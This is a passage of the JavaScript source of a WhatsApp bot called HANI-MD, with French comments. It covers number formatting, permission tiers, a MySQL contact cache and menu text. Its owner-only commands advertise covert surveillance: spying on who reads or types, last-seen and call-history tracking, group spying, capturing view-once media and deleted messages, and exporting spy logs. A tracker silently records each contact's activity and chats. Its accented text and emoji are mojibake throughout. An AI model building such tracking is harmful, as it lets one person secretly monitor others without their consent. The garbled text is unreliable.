  // Les vrais numÃ©ros ont gÃ©nÃ©ralement 8-13 chiffres
  if (clean.length > 13) return true;
  return false;
};

// ðŸ“‡ FONCTION pour extraire un vrai numÃ©ro depuis un JID
const extractRealNumber = (jid) => {
  if (!jid) return null;
  // Si c'est un LID, on ne peut pas avoir le vrai numÃ©ro
  if (String(jid).includes("@lid")) return null;
  // Extraire le numÃ©ro avant @s.whatsapp.net
  const num = String(jid).split("@")[0].split(":")[0];
  if (isLID(num)) return null;
  return num;
};

// ðŸ“‡ FONCTION GLOBALE pour formater un numÃ©ro de tÃ©lÃ©phone joliment
const formatPhoneForDisplay = (number) => {
  if (!number) return "Inconnu";
  const clean = String(number).replace(/[^0-9]/g, '');
  
  // VÃ©rifier si c'est un LID (pas un vrai numÃ©ro)
  if (isLID(clean)) {
    return "âŒ LID (pas un vrai numÃ©ro)";
  }
  
  // CÃ´te d'Ivoire: +225 XX XX XX XX XX
  if (clean.length === 12 && clean.startsWith("225")) {
    return `+225 ${clean.slice(3,5)} ${clean.slice(5,7)} ${clean.slice(7,9)} ${clean.slice(9,11)} ${clean.slice(11)}`;
  } 
  // France: +33 X XX XX XX XX
  else if (clean.length === 11 && clean.startsWith("33")) {
    return `+33 ${clean.slice(2,3)} ${clean.slice(3,5)} ${clean.slice(5,7)} ${clean.slice(7,9)} ${clean.slice(9)}`;
  } 
  // Autre pays (numÃ©ro valide)
  else if (clean.length >= 10 && clean.length <= 14) {
    return `+${clean.slice(0,3)} ${clean.slice(3,6)} ${clean.slice(6,9)} ${clean.slice(9)}`;
  }
  return `+${clean}`;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸŽ« SYSTÃˆME DE PERMISSIONS - COMMANDES PAR NIVEAU
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Commandes accessibles Ã  TOUT LE MONDE (users normaux)
const publicCommands = [
  // GÃ©nÃ©ral
  "ping", "menu", "help", "info", "runtime", "uptime", "alive",
  // Permissions (chacun peut voir son niveau)
  "permissions", "myaccess", "mylevel", "whoami",
  // Fun basique
  "sticker", "s", "toimg", "toimage",
  // TÃ©lÃ©chargement basique
  "tiktok", "tt", "ytmp3", "ytmp4", "play", "song", "video",
  // IA (limitÃ©)
  "gpt", "ai", "gemini",
  // Outils basiques
  "calc", "tts", "translate", "tr",
  // Profil
  "profil", "profile", "me", "level", "rank",
];

// Commandes pour utilisateurs APPROUVÃ‰S (approved) - EXCLUSIVES (pas inclure public)
const approvedOnlyCommands = [
  // TÃ©lÃ©chargement avancÃ©
  "ig", "instagram", "fb", "facebook", "twitter", "x",
  "pinterest", "pin", "spotify", "mediafire",
  // Recherche
  "ytsearch", "lyrics", "weather", "meteo",
  // Images
  "imagine", "dalle", "image",
  // Jeux
  "slot", "dice", "flip", "rps",
];

// Toutes les commandes approved (pour compatibilitÃ©)
const approvedCommands = [...publicCommands, ...approvedOnlyCommands];

// Commandes pour SUDO (admins de confiance) - EXCLUSIVES (pas inclure approved)
const sudoOnlyCommands = [
  // Groupe (modÃ©ration)
  "kick", "add", "promote", "demote", "mute", "unmute",
  "hidetag", "tagall", "antilink", "antispam",
  // Outils avancÃ©s
  "broadcast", "bc",
];

// Toutes les commandes sudo (pour compatibilitÃ©)
const sudoCommands = [...approvedCommands, ...sudoOnlyCommands];

// Commandes OWNER SEULEMENT (toi uniquement)
const ownerOnlyCommands = [
  // ContrÃ´le total
  "eval", "exec", "shell", "restart", "shutdown",
  // Mode du bot
  "mode",
  // Diagnostic systÃ¨me
  "diagnostic", "diag", "health", "sante",
  // Gestion utilisateurs
  "ban", "unban", "sudo", "delsudo", "addsudo", "removesudo", "sudolist",
  "approve", "unapprove", "approved", "addapprove", "removeapprove", "delapprove", "approvelist", "approvedlist",
  // Protections
  "antidelete", "anticall", "viewonce", "audioonce", "savestatus",
  "protection", "antideletestatus",
  // Blocage WhatsApp
  "block", "unblock", "bloquer", "debloquer",
  // Configuration
  "setprefix", "setname", "setbio", "setpp", "setppgroup",
  // Debug
  "test", "debug", "clearsession",
  // Surveillance (tes fonctionnalitÃ©s privÃ©es)
  "deleted", "delmsg", "deletedstatus", "delstatus",
  "vv", "viewonce", "getstatus", "spy", "track", "activity", "invisible",
  // Commandes espion sÃ©parÃ©es (basiques)
  "spyread", "quilit", "spyreply", "quirepond", "spypresence", "quiouvre", "quiecrit",
  "spyhistory", "spyall", "espionhistorique", "spystatus", "quivoitmesstatus",
  "spyon", "spyoff", "spyclear",
  // Commandes espion avancÃ©es
  "lastseen", "derniereconnexion", "online",
  "profilechanges", "changementsprofil", "alertprofil",
  "callhistory", "historiqueappels", "appels",
  "groupspy", "surveillancegroupe", "groupactivity",
  "ghost", "fantome",
  "spyexport", "exportspy", "exporterespion",
  "spystats", "statsespion", "statistiques",
  "trackconfig", "spyconfig", "configespion",
  // Auto ViewOnce
  "autoviewonce", "autovo", "viewonceauto",
  // Messages programmÃ©s
  "schedule", "programmer", "planifier",
  "schedulerepeat", "programmerrepeat", "messagerecurrent",
  "schedulelist", "programmelist", "listeprogrammes",
  "scheduledel", "schedulecancel", "supprimerprogramme",
  "scheduleclear", "clearschedule",
  "schedulepause", "pauseprogramme",
  // Statuts programmÃ©s
  "statusschedule", "schedulestatus", "programstatus", "statutprogramme",
  "statusrepeat", "repeatstatus", "statutrecurrent",
  "statuslist", "liststatus", "statutslist",
  "statusdel", "supprimerstatus",
  "statusclear", "clearstatus",
  // Spotify / Musique
  "spotify", "spotifydl", "spdl", "sp",
  "spsearch", "spotifysearch", "searchspotify",
  "song", "music", "chanson",
];

// Liste des utilisateurs approuvÃ©s
const approvedUsers = new Set();

// ðŸ¤– DÃ‰TECTION BOT DÃ‰SACTIVÃ‰E
// La dÃ©tection automatique et le blocage des bots sont dÃ©sactivÃ©s

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ’¾ STOCKAGE EN MÃ‰MOIRE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const messageStore = new Map();
const MAX_STORED_MESSAGES = 500;
const deletedMessages = [];
const MAX_DELETED_MESSAGES = 50;
const viewOnceMessages = new Map();
const spamTracker = new Map(); // Pour antispam

// Stockage des statuts
const statusStore = new Map();        // Tous les statuts reÃ§us
const deletedStatuses = [];           // Statuts supprimÃ©s
const MAX_STORED_STATUSES = 100;
const MAX_DELETED_STATUSES = 50;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ“‡ BASE DE DONNÃ‰ES DES CONTACTS - MySQL uniquement
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Structure pour stocker les contacts en mÃ©moire (cache)
const contactsDB = new Map();  // numÃ©ro -> { name, jid, firstSeen, lastSeen, ... }

// Charger les contacts depuis MySQL au dÃ©marrage
async function loadContactsFromMySQL() {
  try {
    const contacts = await mysqlDB.getAllContacts();
    if (contacts && Array.isArray(contacts)) {
      for (const contact of contacts) {
        const number = contact.jid?.split("@")[0] || contact.phone;
        if (number) {
          contactsDB.set(number, {
            jid: contact.jid,
            number: number,
            name: contact.name || "Inconnu",
            formattedNumber: formatPhoneNumber(number),
            firstSeen: contact.created_at,
            lastSeen: contact.updated_at,
            messageCount: 0,
            pushName: contact.push_name
          });
        }
      }
      console.log(`[CONTACTS] ${contactsDB.size} contacts chargÃ©s depuis MySQL`);
    }
  } catch (e) {
    console.log(`[CONTACTS] Erreur chargement MySQL: ${e.message}`);
  }
}

// Charger les contacts au dÃ©marrage (aprÃ¨s connexion MySQL)
setTimeout(() => loadContactsFromMySQL(), 5000);

// Ajouter ou mettre Ã  jour un contact
async function updateContact(jid, pushName, additionalData = {}) {
  if (!jid) return null;
  
  const number = jid.split("@")[0];
  if (!number || number.length < 8) return null;
  
  // VÃ©rifier si c'est un vrai numÃ©ro (pas un ID de groupe)
  if (jid.endsWith("@g.us") || jid.includes("-")) return null;
  
  const now = new Date().toLocaleString("fr-FR");
  
  if (!contactsDB.has(number)) {
    // Nouveau contact
    const contactData = {
      jid: jid,
      number: number,
      name: pushName || "Inconnu",
      formattedNumber: formatPhoneNumber(number),
      firstSeen: now,
      lastSeen: now,
      messageCount: 0,
      isBlocked: false,
      notes: "",
      ...additionalData
    };
    contactsDB.set(number, contactData);
    
    // Sauvegarder dans MySQL
    try {
      await mysqlDB.saveContact(jid, pushName || "Inconnu", number, pushName || "");
    } catch (e) {}
    
    console.log(`ðŸ“‡ Nouveau contact: ${pushName || number} (${formatPhoneNumber(number)})`);
  } else {
    // Contact existant - mise Ã  jour
    const contact = contactsDB.get(number);
    if (pushName && pushName.length > 1 && pushName !== "Inconnu") {
      contact.name = pushName;
    }
    contact.lastSeen = now;
    contact.messageCount++;
    // Fusionner les donnÃ©es additionnelles
    Object.assign(contact, additionalData);
    
    // Mettre Ã  jour dans MySQL pÃ©riodiquement
    if (contact.messageCount % 10 === 0) {
      try {
        await mysqlDB.saveContact(jid, contact.name, number, pushName || "");
      } catch (e) {}
    }
  }
  
  return contactsDB.get(number);
}

// RÃ©cupÃ©rer un contact par numÃ©ro
function getContact(numberOrJid) {
  const number = numberOrJid?.split("@")[0]?.replace(/[^0-9]/g, "");
  return contactsDB.get(number) || null;
}

// RÃ©cupÃ©rer le nom d'un contact
function getContactName(numberOrJid) {
  const contact = getContact(numberOrJid);
  if (contact && contact.name && contact.name !== "Inconnu") {
    return contact.name;
  }
  // Fallback: numÃ©ro formatÃ©
  const number = numberOrJid?.split("@")[0];
  return formatPhoneNumber(number);
}

// ðŸ†• OBTENIR INFOS COMPLÃˆTES D'UN CONTACT (Nom + NumÃ©ro)
// Si numÃ©ro > 13 chiffres, affiche juste le nom WhatsApp
function getContactInfo(numberOrJid) {
  if (!numberOrJid) return "Inconnu";
  
  const number = numberOrJid.split("@")[0]?.replace(/[^0-9]/g, "");
  if (!number) return "Inconnu";
  
  const contact = contactsDB.get(number);
  const formattedNum = formatPhoneNumber(number);
  
  // Si numÃ©ro dÃ©passe 13 chiffres, afficher juste le nom
  const isTooLong = number.length > 13;
  
  if (contact && contact.name && contact.name !== "Inconnu" && contact.name.length > 1) {
    // NumÃ©ro trop long = juste le nom
    if (isTooLong) return contact.name;
    return `${contact.name} (${formattedNum})`;
  }
  
  // Essayer le cache secondaire
  const cachedName = contactNameCache.get(number) || contactNameCache.get(numberOrJid);
  if (cachedName && cachedName !== "Inconnu" && cachedName.length > 1) {
    if (isTooLong) return cachedName;
    return `${cachedName} (${formattedNum})`;
  }
  
  // Pas de nom trouvÃ©
  if (isTooLong) return "Contact WhatsApp";
  return formattedNum;
}

// Lister tous les contacts
function getAllContacts() {
  return Array.from(contactsDB.values());
}

// Rechercher un contact par nom ou numÃ©ro
function searchContacts(query) {
  const q = query.toLowerCase();
  return getAllContacts().filter(c => 
    c.name.toLowerCase().includes(q) || 
    c.number.includes(q) ||
    c.formattedNumber.includes(q)
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ•µï¸ SYSTÃˆME DE SURVEILLANCE / TRACKING
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const activityTracker = new Map();    // Suivi d'activitÃ© par utilisateur
const watchList = new Set();          // Liste des numÃ©ros Ã  surveiller
const mediaStore = new Map();         // Stockage des mÃ©dias reÃ§us par utilisateur
const MAX_MEDIA_PER_USER = 20;        // Max mÃ©dias stockÃ©s par utilisateur

function trackActivity(jid, pushName, type, chatWith) {
  const number = jid?.split("@")[0];
  if (!number) return;
  
  if (!activityTracker.has(number)) {
    activityTracker.set(number, {
      name: pushName || "Inconnu",
      number: number,
      firstSeen: new Date().toLocaleString("fr-FR"),
      lastSeen: new Date().toLocaleString("fr-FR"),
      messageCount: 0,
      activities: [],
      chats: new Set()
    });
  }
  
  const tracker = activityTracker.get(number);
  tracker.name = pushName || tracker.name;
  tracker.lastSeen = new Date().toLocaleString("fr-FR");
  tracker.messageCount++;
  
  // Ajouter l'activitÃ© (garder les 50 derniÃ¨res)
  tracker.activities.push({
    type: type,
    time: new Date().toLocaleString("fr-FR"),
    chat: chatWith
  });
  if (tracker.activities.length > 50) tracker.activities.shift();
  
  // Tracker les chats (groupes)
  if (chatWith) {
    tracker.chats.add(chatWith);
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ”§ FONCTIONS UTILITAIRES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Formater un numÃ©ro au format +225 XX XX XX XX XX (CÃ´te d'Ivoire)
function formatPhoneNumber(number) {
  if (!number) return "Inconnu";
  
  // Nettoyer le numÃ©ro (enlever @s.whatsapp.net, @g.us, etc.)
  let clean = number.toString().replace(/@.+$/, "").replace(/[^0-9]/g, "");
  
  // Format ivoirien: 225 + 10 chiffres
  if (clean.startsWith("225") && clean.length >= 12) {
    const prefix = "+225";
    const num = clean.substring(3); // Les 10 chiffres aprÃ¨s 225
    // Formater: XX XX XX XX XX
    if (num.length >= 10) {
      return `${prefix} ${num.substring(0, 2)} ${num.substring(2, 4)} ${num.substring(4, 6)} ${num.substring(6, 8)} ${num.substring(8, 10)}`;
    }
    return `${prefix} ${num}`;
  }
  
  // Autres formats internationaux
  if (clean.length > 8) {
    return `+${clean}`;
  }
  
  return clean;
}

function getMessageText(msg) {
  if (!msg?.message) return "";
  
  const m = msg.message;
  
  // ðŸ”§ DEBUG: Afficher les clÃ©s du message pour comprendre la structure
  const keys = Object.keys(m);
  if (keys.length > 0 && !keys.includes('messageContextInfo') && keys[0] !== 'reactionMessage') {
    console.log(`[GETTEXT] Message keys: ${keys.join(", ")}`);
  }
  
  // GÃ©rer viewOnceMessageV2 et viewOnceMessageV2Extension
  if (m.viewOnceMessageV2) {
    return getMessageText({ message: m.viewOnceMessageV2.message });
  }
  if (m.viewOnceMessageV2Extension) {
    return getMessageText({ message: m.viewOnceMessageV2Extension.message });
  }
  if (m.viewOnceMessage) {
    return getMessageText({ message: m.viewOnceMessage.message });
  }
  
  // ðŸ†• GÃ©rer le type "chat" (nouveau format WhatsApp)
  if (m.chat) {
    if (typeof m.chat === 'string') return m.chat;
    if (m.chat?.text) return m.chat.text;
    if (m.chat?.displayText) return m.chat.displayText;
  }
  
  // Essayer plusieurs types de messages
  if (m.conversation) return m.conversation;
  if (m.extendedTextMessage?.text) return m.extendedTextMessage.text;
  if (m.imageMessage?.caption) return m.imageMessage.caption;
  if (m.videoMessage?.caption) return m.videoMessage.caption;
  if (m.documentMessage?.caption) return m.documentMessage.caption;
  if (m.buttonsResponseMessage?.selectedButtonId) return m.buttonsResponseMessage.selectedButtonId;
  if (m.listResponseMessage?.singleSelectReply?.selectedRowId) return m.listResponseMessage.singleSelectReply.selectedRowId;
  if (m.templateButtonReplyMessage?.selectedId) return m.templateButtonReplyMessage.selectedId;
  if (m.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
    try {
      const params = JSON.parse(m.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
      return params.id || "";
    } catch {}
  }
  
  // Fallback: chercher du texte dans n'importe quelle propriÃ©tÃ©
  const type = getContentType(m);
  if (type && m[type]) {
    const content = m[type];
    if (typeof content === 'string') return content;
    if (content?.text) return content.text;
    if (content?.caption) return content.caption;
    if (content?.contentText) return content.contentText;
    if (content?.selectedDisplayText) return content.selectedDisplayText;
    if (content?.displayText) return content.displayText;
  }
  
  // ðŸ”§ Dernier recours: chercher rÃ©cursivement du texte
  for (const key of keys) {
    if (key === 'messageContextInfo' || key === 'senderKeyDistributionMessage') continue;
    const val = m[key];
    if (typeof val === 'string' && val.length > 0 && val.length < 1000) {
      console.log(`[GETTEXT] TrouvÃ© texte dans "${key}": ${val.slice(0, 50)}`);
      return val;
    }
    if (val && typeof val === 'object') {
      if (val.text) return val.text;
      if (val.caption) return val.caption;
      if (val.displayText) return val.displayText;
    }
  }
  
  return "";
}

function formatUptime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);
  
  if (days > 0) return `${days}j ${hours % 24}h ${minutes % 60}m`;
  if (hours > 0) return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
  if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
  return `${seconds}s`;
}

function isGroup(jid) {
  return jid?.endsWith("@g.us");
}

function extractNumber(jid) {
  return jid?.split("@")[0] || "";
}

function formatNumber(number) {
  return number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}

// Valider si c'est un vrai numÃ©ro de tÃ©lÃ©phone (pas un ID de groupe/message)
function isValidPhoneNumber(num) {
  if (!num) return false;
  const cleaned = num.replace(/[^0-9]/g, "");
  // Un numÃ©ro valide a entre 10 et 15 chiffres
  return cleaned.length >= 10 && cleaned.length <= 15;
}

// Cache pour stocker les noms des contacts
const contactNamesCache = new Map();

// Stocker le nom d'un contact (accepte les numÃ©ros ET les LID)
function cacheContactName(jid, name) {
  if (jid && name && name.length > 1) {
    const num = jid.split("@")[0];
    // Accepter les numÃ©ros de tÃ©lÃ©phone valides OU les LID (identifiants internes WhatsApp)
    if (num && (isValidPhoneNumber(num) || /^\d{10,20}$/.test(num))) {
      contactNamesCache.set(num, name);
    }
  }
}

// RÃ©cupÃ©rer le nom d'un contact depuis le cache
function getCachedContactName(jid) {
  const num = jid?.split("@")[0];
  return contactNamesCache.get(num) || null;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸŽ¨ MENUS ET TEXTES (SIMPLIFIÃ‰)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function getMainMenu(prefix, userRole = "user") {
  const time = new Date();
  const hours = time.getHours();
  const greeting = hours < 12 ? "ðŸŒ… Bonjour" : hours < 18 ? "â˜€ï¸ Bon aprÃ¨s-midi" : "ðŸŒ™ Bonsoir";
  
  // Menu pour les USERS (accÃ¨s basique)
  if (userRole === "user") {
    return `
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
â”ƒ  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  â”ƒ
â”ƒ  â•‘  ðŸ¤– *HANI-MD* 2.6  â•‘  â”ƒ
â”ƒ  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”ƒ
â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
â”ƒ ${greeting}!                 â”ƒ
â”ƒ ðŸ“Œ PrÃ©fixe: *${prefix}*            â”ƒ
â”ƒ ðŸ‘¤ RÃ´le: *Utilisateur*       â”ƒ
â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›

â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ“Œ GÃ‰NÃ‰RAL ã€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}menu   âžœ Ce menu
â”‚ ${prefix}ping   âžœ Test connexion
â”‚ ${prefix}info   âžœ Infos bot
â”‚ ${prefix}whoami âžœ Ton profil
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ”§ OUTILS ã€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}sticker âžœ CrÃ©er sticker
â”‚ ${prefix}calc    âžœ Calculatrice
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ’Ž PREMIUM ã€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}premium âžœ Voir les plans
â”‚ ${prefix}myplan  âžœ Mon abonnement
â”‚ ${prefix}plans   âžœ Comparer les plans
â”‚ ${prefix}upgrade âžœ Activer un code
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ”’ LIMITÃ‰ ã€â”€â”€â”€â”€â”€â”€â”
â”‚ âŒ Commandes groupe
â”‚ âŒ Protections bot
â”‚ âŒ Fonctions avancÃ©es
â”‚
â”‚ ðŸ’¡ Demande l'accÃ¨s au owner!
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
`;
  }
  
  // Menu pour les APPROVED (accÃ¨s intermÃ©diaire)
  if (userRole === "approved") {
    return `
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
â”ƒ  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  â”ƒ
â”ƒ  â•‘  ðŸ¤– *HANI-MD* 2.6  â•‘  â”ƒ
â”ƒ  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”ƒ
â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
â”ƒ ${greeting}!                 â”ƒ
â”ƒ ðŸ“Œ PrÃ©fixe: *${prefix}*            â”ƒ
â”ƒ âœ… RÃ´le: *ApprouvÃ©*          â”ƒ
â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›

â”Œâ”€â”€â”€ã€Œ ðŸ“Œ GÃ‰NÃ‰RAL ã€â”€â”€â”€â”
â”‚ ${prefix}menu â€¢ ${prefix}ping â€¢ ${prefix}info
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€ã€Œ ðŸ”§ OUTILS ã€â”€â”€â”€â”
â”‚ ${prefix}sticker â€¢ ${prefix}calc
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€ã€Œ ðŸ”’ NON DISPONIBLE ã€â”€â”€â”€â”
â”‚ âŒ Admin groupe
â”‚ âŒ Protections
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
`;
  }
  
  // Menu pour les SUDO (accÃ¨s Ã©tendu)
  if (userRole === "sudo") {
    return `
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
â”ƒ  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  â”ƒ
â”ƒ  â•‘  ðŸ¤– *HANI-MD* 2.6  â•‘  â”ƒ
â”ƒ  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”ƒ
â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
â”ƒ ${greeting}!                 â”ƒ
â”ƒ ðŸ“Œ PrÃ©fixe: *${prefix}*            â”ƒ
â”ƒ âš¡ RÃ´le: *Sudo*              â”ƒ
â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›

â”Œâ”€â”€â”€ã€Œ ðŸ“Œ BASIQUES ã€â”€â”€â”€â”
â”‚ ${prefix}menu â€¢ ${prefix}ping â€¢ ${prefix}info
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€ã€Œ ðŸ‘¥ GROUPE ã€â”€â”€â”€â”
â”‚ ${prefix}kick    âžœ Exclure
â”‚ ${prefix}add     âžœ Ajouter
â”‚ ${prefix}promote âžœ Promouvoir
â”‚ ${prefix}demote  âžœ RÃ©trograder
â”‚ ${prefix}link    âžœ Lien groupe
â”‚ ${prefix}tagall  âžœ Tag tous
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€ã€Œ ðŸ‘‘ GESTION ã€â”€â”€â”€â”
â”‚ ${prefix}approve â€¢ ${prefix}ban
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€ã€Œ ðŸ”’ RÃ‰SERVÃ‰ OWNER ã€â”€â”€â”€â”
â”‚ âŒ sudo/delsudo
â”‚ âŒ Protections avancÃ©es
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
`;
  }
  
  // Menu COMPLET pour OWNER - Format moderne et aÃ©rÃ©
  return `
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
â”ƒ      â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—      â”ƒ
â”ƒ      â•‘   ðŸ¤– *HANI-MD V2.6.0*   â•‘      â”ƒ
â”ƒ      â•‘     _by H2025 SECURE_   â•‘      â”ƒ
â”ƒ      â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•      â”ƒ
â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
â”ƒ  ${greeting}! ðŸ‘‘                         â”ƒ
â”ƒ  ðŸ“Œ PrÃ©fixe: *${prefix}*  â”‚  ðŸ¤– Mode: *${config.MODE}*     â”ƒ
â”ƒ  ðŸ‘‘ RÃ´le: *OWNER* - AccÃ¨s Total        â”ƒ
â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ðŸ“‹ *CATÃ‰GORIES*            â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ“Œ GÃ‰NÃ‰RAL ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}ping     â”‚ ${prefix}info     â”‚ ${prefix}stats
â”‚ ${prefix}whoami   â”‚ ${prefix}menu     â”‚ ${prefix}uptime
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

